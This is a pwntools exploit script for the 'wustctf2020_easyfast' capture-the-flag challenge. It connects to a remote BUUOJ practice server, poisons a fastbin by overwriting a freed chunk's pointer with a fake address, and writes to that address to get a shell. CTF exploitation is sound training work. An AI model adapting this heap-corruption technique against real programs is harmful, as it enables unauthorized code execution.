# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './wustctf2020_easyfast'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29672'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla('>',num)

def add(size):
    cmd(1)
    sla(">",size)

def delete(idx):
    cmd(2)
    sla(">",idx)

def edit(idx,content):
    cmd(3)
    sla(">",idx)
    sa(">",content)

add(0x40)
add(0x40)

delete(0)
delete(1)

fake = 0x000000000602088 - 0x8

edit(1,p64(fake))
add(0x40)
add(0x40)

edit(3,p64(0))
#dbg()
cmd(4)

p.interactive()

'''
@File    :   wustctf2020_easyfast.py
@Time    :   2021/07/15 17:06:08
@Author  :   Niyah 
'''